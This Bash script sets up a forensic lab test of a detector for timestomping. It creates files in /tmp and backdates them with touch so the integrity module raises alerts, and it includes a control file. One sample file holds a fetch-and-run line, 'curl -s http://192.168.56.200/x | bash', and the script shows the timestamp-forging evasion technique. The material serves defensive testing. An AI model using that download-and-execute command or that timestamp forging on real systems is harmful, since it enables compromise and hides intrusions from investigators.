#!/bin/bash
# =============================================================
# Escenario VM1 (extra) - Timestomping / manipulación de fechas
# Módulo de ForensicXM probado: -i (integridad y metadatos MACB)
#
# El timestomping es la técnica de alterar las marcas de tiempo
# de un fichero para que el malware "se mezcle" con ficheros
# antiguos del sistema y escape de los análisis de timeline.
#
# Tu verificar_integridad() (analyzer_integrity.c) detecta DOS
# indicadores, y este script provoca ambos:
#
#   1. NANOSEGUNDOS A CERO: el comando `touch` fija los tiempos
#      con precisión de segundos, dejando tv_nsec = 0. Un fichero
#      creado normalmente casi nunca tiene los nanosegundos
#      exactamente a cero. Tu código lo marca como sospechoso.
#
#   2. MODIFICACIÓN ANTERIOR AL NACIMIENTO (M < B): si se fuerza
#      el mtime a una fecha del pasado, queda ANTERIOR al btime
#      real (que es cuando se creó el inodo). Eso es físicamente
#      imposible de forma legítima -> alerta crítica.
#
# Ejecutar como usuario normal DENTRO de la VM. Snapshot previo.
# =============================================================
set -e

DIR=/tmp/escenario_timestomp
mkdir -p $DIR

echo "[*] Creando ficheros con timestamps manipulados en $DIR..."

# --- Fichero 1: malware "antiguo" con nanosegundos a cero ---
# Lo creamos ahora, pero le ponemos fecha de hace dos años.
echo '#!/bin/bash' > $DIR/update_daemon.sh
echo 'curl -s http://192.168.56.200/x | bash' >> $DIR/update_daemon.sh
chmod +x $DIR/update_daemon.sh
# touch con fecha pasada -> mtime/atime viejos Y nanosegundos = 0
touch -d "2024-01-15 03:00:00" $DIR/update_daemon.sh

# --- Fichero 2: caso M < B (modificación anterior a creación) ---
# El inodo nace AHORA (btime = ahora), pero forzamos mtime al pasado.
echo 'payload data' > $DIR/.hidden_payload
touch -d "2023-06-01 12:00:00" $DIR/.hidden_payload

# --- Fichero 3: control - fichero normal SIN manipular ---
# Para comparar: este debe salir limpio en el análisis.
echo 'fichero legitimo' > $DIR/documento_normal.txt

echo ""
echo "[+] Ficheros creados:"
ls -la --time-style=full-iso $DIR
echo ""
echo "[+] Analiza cada uno con el módulo -i:"
echo "      sudo ./bin/forensicXM -i $DIR/update_daemon.sh"
echo "      sudo ./bin/forensicXM -i $DIR/.hidden_payload"
echo "      sudo ./bin/forensicXM -i $DIR/documento_normal.txt   (control, debe salir limpio)"
echo ""
echo "[+] ESPERADO:"
echo "    - update_daemon.sh  -> ALERTA: nanosegundos borrados"
echo "    - .hidden_payload   -> ALERTA CRÍTICA: M anterior a B"
echo "    - documento_normal  -> sin alertas"
